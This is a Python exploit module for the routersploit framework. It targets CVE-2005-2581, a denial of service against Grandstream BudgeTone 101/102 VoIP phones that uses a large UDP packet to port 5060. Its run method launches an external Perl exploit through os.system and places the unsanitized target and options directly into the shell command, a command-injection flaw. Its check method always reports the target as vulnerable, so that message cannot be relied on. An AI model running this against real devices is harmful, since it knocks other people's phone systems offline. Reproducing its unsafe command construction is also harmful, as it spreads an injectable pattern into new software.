
import sys,os
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):


    __info__ = {
        "name": "CVE-2005-2581",

        "description": "Grandstream BudgeTone 101 and 102 running firmware 1.0.6.7 and possibly earlier  "
                       "versions, allows remote attackers to cause a denial of service  "
                       "(device hang or reboot) via a large UDP packet to port 5060.",

        "authors": (

            "l0cK",  # vulnerability discovery

            "###",  # routersploit module

        ),

        "references": (

            "https://www.exploit-db.com/exploits/1153",

        ),

        "devices": (

            "Grandstream, CVE-2005-2581"
        ),
    }


    target = OptIP("", "victim ipv4 or ipv6")
    port = OptPort("5060"," udp-port ")
    option = OptString("","-r = 'reboot'  the Grandstream BT 101/102 ; -s = 'shutdown' the Grandstream BT 101/102")


    
    def run(self):

        if self.check():

            print_success("Target seems to be vulnerable")
            text = os.path.basename(__file__)
            print(text)
            path = os.path.realpath(__file__)
            path = path.replace(text,'')
            path = path.replace('\\','/')
            path1 = 'cd {}'.format(path)
            fileName = 'perl {} {} {} {}'.format('exploit-db-1153.pl',self.target,self.port,self.option)
            path2 = path1 + " && " + fileName
            #print(path2)
            os.system(path2)
        else:

            print_error("Exploit failed - target seems to be not vulnerable")


    def check(self):
       
        return True